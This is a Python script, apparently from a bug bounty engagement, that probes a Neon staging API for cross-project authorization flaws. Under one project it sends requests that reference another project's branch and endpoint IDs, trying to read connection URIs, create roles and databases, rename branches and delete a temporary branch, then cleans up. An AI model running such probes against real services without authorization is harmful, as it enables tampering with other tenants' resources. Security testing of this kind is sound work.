# -*- coding: utf-8 -*-
"""W3d: cross-project object-reference sweep - PA path + PB object ids.
Each op: if path-project authz is the only gate and object ids are trusted,
foreign-object mutation may succeed. Any 2xx = finding; 4xx = closed.
Probes (all under project PA, referencing PB main branch br-raspy-band-w247957z):
 1 GET connection_uri?branch_id=<PB>        (info read of foreign branch URI)
 2 POST /projects/PA/branches/<PB>/roles    (create role on foreign branch)
 3 POST /projects/PA/endpoints ep.branch_id=<PB main> (compute on foreign branch)
 4 PATCH /projects/PA/branches/<PB>         (rename foreign branch)
 5 PATCH /projects/PA/branches/<PB>/endpoints/<ep-PB> (settings on foreign ep)
 6 DELETE /projects/PA/branches/<PB>        (delete foreign branch - skipped: real
                                            impact; instead list check afterwards)
 7 POST /projects/PA/branches/<PB>/databases (create db on foreign branch)
Cleanup: delete anything created on PB. X-Bug-Bounty: xxbo.
"""
import json
import ssl
import time
import uuid
import http.client

API_HOST = "console-stage.neon.build"
API_BASE = "/api/v2"
HB = {"X-Bug-Bounty": "xxbo", "Content-Type": "application/json"}
PA = "orange-sun-90493739"
PB = "damp-term-63384673"
PBMAIN = "br-raspy-band-w247957z"
TAG = "w3d" + uuid.uuid4().hex[:4]
LOG = r"F:\scan\neon_report\_w3d_out.txt"

with open(r"F:\scan\neon_report\_apikey.json", encoding="utf-8") as fh:
    APIKEY = json.load(fh)["key"]


def out(s):
    line = "[%s] %s" % (time.strftime("%H:%M:%S"), s)
    print(line, flush=True)
    with open(LOG, "a", encoding="utf-8") as fh:
        fh.write(line + "\n")


def call(method, path, body=None, timeout=30, tries=3):
    last = (None, "")
    for _ in range(tries):
        try:
            ctx = ssl.create_default_context()
            conn = http.client.HTTPSConnection(API_HOST, timeout=timeout, context=ctx)
            payload = json.dumps(body) if body is not None else None
            conn.request(method, API_BASE + path, body=payload,
                         headers=dict(HB, Authorization="Bearer " + APIKEY))
            resp = conn.getresponse()
            data = resp.read().decode("utf-8", "replace")
            conn.close()
            return resp.status, data
        except Exception as e:
            last = (None, str(e)[:120])
            time.sleep(2)
    return last


def main():
    out("== W3d cross-project ref sweep  tag=%s ==" % TAG)
    created = []

    # baseline: get PB main's endpoint id (for probe 5) + temp branch for probe 6
    st, raw = call("GET", "/projects/%s/branches/%s/endpoints" % (PB, PBMAIN))
    peps = []
    if st == 200:
        peps = json.loads(raw).get("endpoints", [])
    out("PB main endpoints: %d" % len(peps))
    st, raw = call("POST", "/projects/%s/branches" % PB,
                   {"branch": {"name": "w3dtmp-%s" % TAG, "parent_id": PBMAIN}})
    tmp_id = None
    if st in (200, 201):
        tmp_id = json.loads(raw).get("branch", {}).get("id")
    out("PB temp branch: %s" % (tmp_id or raw[:150]))

    probes = [
        ("1 uri foreign", "GET",
         "/projects/%s/connection_uri?database_name=neondb"
         "&role_name=neondb_owner&branch_id=%s" % (PA, PBMAIN), None),
        ("2 create role f", "POST", "/projects/%s/branches/%s/roles" % (PA, PBMAIN),
         {"role": {"name": "w3drole-%s" % TAG}}),
        ("3 ep on f branch", "POST", "/projects/%s/endpoints" % PA,
         {"endpoint": {"branch_id": PBMAIN, "type": "read_write"}}),
        ("4 rename f br", "PATCH", "/projects/%s/branches/%s" % (PA, PBMAIN),
         {"branch": {"name": "w3dhijack-%s" % TAG}}),
        ("5 ep cfg f", "PATCH", "/projects/%s/branches/%s/endpoints/%s"
         % (PA, PBMAIN, peps[0]["id"]) if peps else "/none", None),
        ("6 delete f br", "DELETE", "/projects/%s/branches/%s" % (PA, tmp_id), None),
        ("7 create db f", "POST", "/projects/%s/branches/%s/databases" % (PA, PBMAIN),
         {"database": {"name": "w3ddb-%s" % TAG}}),
    ]
    for tag, m, p, b in probes:
        if p.endswith("/none"):
            out("%-16s -> skipped (no foreign ep)" % tag)
            continue
        st, raw = call(m, p, b)
        out("%-16s -> %s %s" % (tag, st, raw[:220]))
        if st in (200, 201, 202, 204):
            # inspect: name changes / object created?
            if tag == "4":
                st2, raw2 = call("GET", "/projects/%s/branches/%s" % (PB, PBMAIN))
                out("   verify PB main name now: %s" %
                    (json.loads(raw2).get("branch", {}).get("name") if st2 == 200 else raw2[:120]))
            if tag == "7":
                st2, raw2 = call("GET", "/projects/%s/branches/%s/databases" % (PB, PBMAIN))
                out("   verify PB dbs: %s" % raw2[:300])
            if tag == "6" and tmp_id:
                st2, raw2 = call("GET", "/projects/%s/branches" % PB)
                names = [b.get("name") for b in json.loads(raw2).get("branches", [])] if st2 == 200 else []
                out("   verify PB branches after cross-del: %s" % names)
        time.sleep(1)

    # cleanup: delete temp branch on PB (real delete via own path), role if any
    if tmp_id:
        st, raw = call("DELETE", "/projects/%s/branches/%s" % (PB, tmp_id))
        out("cleanup temp: %s" % st)
    st, raw = call("DELETE", "/projects/%s/branches/%s/roles/w3drole-%s"
                   % (PB, PBMAIN, TAG))
    out("cleanup role: %s" % st)
    out("== W3d DONE")


if __name__ == "__main__":
    main()
